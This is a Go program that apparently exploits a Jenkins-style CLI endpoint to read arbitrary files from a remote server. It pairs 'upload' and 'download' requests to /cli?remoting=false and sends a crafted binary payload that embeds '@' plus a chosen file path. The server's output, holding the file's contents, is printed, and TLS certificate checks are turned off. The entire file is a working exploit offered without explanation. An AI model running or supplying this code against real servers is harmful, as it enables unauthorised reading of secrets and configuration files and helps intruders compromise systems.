package main

import (
    "bytes"
    "crypto/tls"
    "errors"
    "fmt"
    "github.com/google/uuid"
    "io"
    "log"
    "net/http"
    "os"
)

func init() {
    http.DefaultClient.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
}

func main() {
    rootUrl := os.Args[1]
    targetFile := os.Args[2]
    sessionId := uuid.New().String()
    fileContentChan := make(chan string)
    if err := waitForResp(rootUrl, sessionId, fileContentChan); err != nil {
        panic(err)
    }
    if err := requestFile(rootUrl, targetFile, sessionId); err != nil {
        panic(err)
    }
    result := <-fileContentChan
    fmt.Println(result)
}

func requestFile(rootUrl string, targetFile string, sessionId string) error {
    payload := "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@" + targetFile + "\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
    req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", bytes.NewBufferString(payload))
    if err != nil {
        return err
    }
    req.Header.Set("Session", sessionId)
    req.Header.Set("Side", "upload")
    req.Header.Set("Content-Type", "application/octet-stream")
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return err
    }
    if resp.StatusCode != http.StatusOK {
        return errors.New("upload request error")
    }
    return nil
}

func waitForResp(rootUrl string, sessionId string, respChan chan string) error {
    req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", nil)
    if err != nil {
        return err
    }
    req.Header.Set("Session", sessionId)
    req.Header.Set("Side", "download")
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return err
    }
    if resp.StatusCode != http.StatusOK {
        return errors.New("download request error")
    }
    go func() {
        defer resp.Body.Close()
        resonseBytes, err := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
        if err != nil {
            log.Println(err)
        }
        respChan <- string(resonseBytes)
    }()
    return nil
}
